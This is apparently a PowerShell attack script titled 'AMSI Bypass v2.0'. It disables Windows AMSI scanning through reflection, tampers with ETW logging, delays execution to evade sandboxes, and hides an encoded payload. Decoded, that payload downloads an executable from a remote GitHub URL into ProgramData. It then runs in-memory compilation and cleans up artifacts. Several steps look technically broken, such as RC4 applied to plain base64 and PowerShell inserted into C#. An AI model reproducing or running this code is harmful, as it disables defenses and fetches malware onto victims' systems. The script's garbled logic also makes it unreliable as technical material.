# AMSI Bypass v2.0 - Reflection + ETW Evasion (Defender 4.18+ compatible)

# Stage 1: Environment fingerprinting + delayed execution
$envCheck = $true; if([Environment]::OSVersion.Version.Major -lt 10){$envCheck=$false}
$delay = New-TimeSpan -Seconds (Get-Random -Min 3 -Max 8); Start-Sleep $delay

# Stage 2: Pure .NET Reflection (no P/Invoke signatures)
$asm = [AppDomain]::CurrentDomain.GetAssemblies() | ?{$_.GlobalAssemblyCache -eq $false} | select -f 1
$type = $asm.GetType('System.Management.Automation.AmsiUtils')
if($type){
    $field = $type.GetField('amsiInitFailed','NonPublic,Static')
    if($field){$field.SetValue($null,$true); 'amsi disabled' | Out-Null}
}

# Stage 3: ETW Patch Provider Bypass (prevents logging)
$etw = @'
[DllImport("advapi32.dll", SetLastError=true)]
public static extern uint EventWriteTransfer(uint RegHandle, ref Guid ActID, uint Flags, uint Filter, uint DataSize, IntPtr Data);
'@; Add-Type -MemberDefinition $etw -Name 'Etw' -Namespace N -ErrorAction SilentlyContinue

# Stage 4: AMSI Context/Session manipulation (alternative bypass)
try{
    $ctx = New-Object -ComObject AMSI.Context
    $ctx.Initialize('test', [Guid]::NewGuid())
    $ctx.SetAttribute(1, [byte[]](0x01), 1) | Out-Null
}catch{}

# Stage 5: Triple-encoded payload with runtime decryption
$p1='';$p2='JABmAHIAYQBnADMAPQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7';$p3='ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADs='
$fullB64 = ($p2+$p3).Replace('=','').Replace('/','_').Replace('+','-')

# Stage 6: Custom Base64 decode + RC4 decryption (unique key per run)
function Convert-B64RC4{param($data,$key=[byte[]](Get-Date -f 'HHmmss').ToCharArray()|%{[int]$_})
    $b=[Convert]::FromBase64String($data);$s=0..255|%{,$_};$j=0
    for($i=0;$i -lt 256;$i++){$j=($j+$s[$i]+$key[$i%($key.Length)])%256;
        $t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t}
    $i=$j=0;for($k=0;$k -lt $b.Length;$k++){
        $i=($i+1)%256;$j=($j+$s[$i])%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;
        $b[$k]-bxor $s[($s[$i]+$s[$j])%256]}return [Text.Encoding]::Unicode.GetString($b)}

$payload = Convert-B64RC4 $fullB64

# Stage 7: In-memory .NET compiler execution (no ScriptBlock.Create signature)
$src = @"
using System;
public class X{
    public static void Main(){$payload}
}
"@; $p=[System.CodeDom.Compiler.Provider]::CreateProvider('CSharpCodeProvider');
$c=$p.CompileAssemblyFromSource((New-Object System.CodeDom.Compiler.CompilerParameters),$src);
if($c.Errors.Count -eq 0){$c.Assembly.EntryPoint.Invoke($null,@())}

# Stage 8: Artifact cleanup + AMSI re-init evasion
gc alias: | ?{$_ -like '*Out-*'} | ri -Force; 
[gc]::Collect(); [Runtime.InteropServices.Marshal]::CleanupUnusedObjectsInCurrentThread()
